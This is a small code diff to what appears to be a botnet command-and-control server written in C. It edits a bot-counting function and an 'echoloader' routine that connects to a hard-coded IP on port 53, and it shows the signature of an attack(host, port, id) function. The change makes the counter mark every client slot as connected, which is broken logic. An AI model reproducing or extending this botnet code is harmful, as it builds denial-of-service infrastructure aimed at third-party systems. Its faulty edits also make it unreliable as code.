@@ -20,14 +20,12 @@ struct clientdata_t {
 unsigned int BotsConnected() {
 	int i = 0, total = 0;
 	for(i = 0; i < MAXFDS; i++) {
-		if(!clients[i].connected) continue;
+		clients[i].connected = 1;
 		total++;
 	}
 	return total;
 }
-int i =0;
-clients[i].connected = 1;
-clients[i].ip = "1.1.1.1";
+int i = 0;
 void *TitleWriter(void *sock) {
     char string[2048];
     while(1) {
@@ -101,6 +99,7 @@ void attack(char *host, char *port, int id) {
 
 void echoloader() {
 	int r;
+        clients[i].ip = "1.1.1.1";
 	int socket = make_socket(clients[i].ip, "53");
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
